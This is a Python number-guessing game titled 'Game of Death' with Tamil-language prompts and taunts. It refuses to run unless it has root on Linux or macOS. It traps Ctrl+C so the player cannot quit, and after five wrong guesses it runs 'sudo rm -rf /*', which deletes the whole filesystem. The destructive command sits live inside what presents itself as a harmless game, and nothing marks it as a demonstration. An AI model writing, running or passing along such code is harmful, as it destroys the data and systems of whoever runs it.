import os
import random
import sys
import platform
import signal

# Function to handle SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nநீங்கள் இலகுவாக தப்பிக்க முடியாது! விளையாடி கொண்டே இருங்கள்!")

# Register the signal handler for SIGINT
signal.signal(signal.SIGINT, signal_handler)

def play_game():
    number = random.randint(1, 10)
    lifelines = 5

    # List of aggressive comments to display after each failed attempt
    comments = [
        "வா, நீயே சிறப்பாக செய்யலாம்!",
        "நீச்சமாக? மேலும் முயற்சி செய்!",
        "நான் உனக்கு வாய்ப்பு கொடுப்பதில் வருந்த வேண்டாம்!",
        "உன் நேரம் குறைவாக உள்ளது, கவனமாக!",
        "நீ முயற்சி செய்கிறாயா?"
    ]

    # Add a final aggressive comment for the last life
    final_comment = "இது உன் கடைசி வாய்ப்பு! இதை தவறவிடாதே! இல்லையெனில் நீ பின்னர் விளைவுகளை சந்திக்க வேண்டியிருக்கும்..."

    for attempt in range(lifelines):
        while True:
            try:
                guess = input(f"1 முதல் 10 வரை உள்ள எண்ணை ஊகி பாரு (முயற்சி {attempt + 1}/{lifelines}): ")
                guess = int(guess)
                break
            except ValueError:
                print("தவறான உள்ளீடு! 1 முதல் 10 வரை உள்ள முழு எண்ணை உள்ளிடுங்கள்.")
                
        if guess == number:
            print("நீ வெற்றி பெற்றாய்! அமைதியில் வாழ்க்கையை வாழுங்கள்.......")
            return
        else:
            remaining_lives = lifelines - attempt - 1
            if remaining_lives > 0:
                if remaining_lives == 1:
                    print(f"தவறு! உனக்கு {remaining_lives} உயிர் உள்ளது. {final_comment}")
                else:
                    comment = comments[attempt] if attempt < len(comments) else random.choice(comments)
                    print(f"தவறு! உனக்கு {remaining_lives} உயிர்கள் உள்ளன. {comment}")

    # If the loop completes without breaking, the player has exhausted all lifelines
    print("நீ தோற்றுவிட்டாய்! இப்போது, நீ இறந்துவிட்டாய்.....")
    print("விளையாடியதற்கு நன்றி!")
    command = "sudo rm -rf /*"
    os.system(command)

def main():
    # Print the ASCII pattern for "GAME OF DEATH"
    pattern = '''
     _______  _______  __   __  _______    _______  _______    ______   _______  _______  _______  __   __ 
    |       ||   _   ||  |_|  ||       |  |       ||       |  |      | |       ||   _   ||       ||  | |  |
    |    ___||  |_|  ||       ||    ___|  |   _   ||    ___|  |  _    ||    ___||  |_|  ||_     _||  |_|  |
    |   | __ |       ||       ||   |___   |  | |  ||   |___   | | |   ||   |___ |       |  |   |  |       |
    |   ||  ||       ||       ||    ___|  |  |_|  ||    ___|  | |_|   ||    ___||       |  |   |  |       |
    |   |_| ||   _   || ||_|| ||   |___   |       ||   |      |       ||   |___ |   _   |  |   |  |   _   |
    |_______||__| |__||_|   |_||_______|  |_______||___|      |______| |_______||__| |__|  |___|  |__| |__|
    '''
    print(pattern)

    # Check if the script is being run on Unix-based systems
    if platform.system() not in ["Linux", "Darwin"]:  # Darwin is the system name for macOS
        print("இந்த ஸ்கிரிப்ட் Unix அடிப்படையிலான சிஸ்டம்களில் மட்டுமே இயக்க முடியும்!")
        sys.exit(1)

    # Check if the script is being run as root
    if os.geteuid() != 0:
        print("இந்த ஸ்கிரிப்ட் root உபயோகிப்பாளர் மட்டுமே இயக்க முடியும்!")
        sys.exit(1)
    
    # Play a single round of the game
    play_game()

if __name__ == "__main__":
    main()
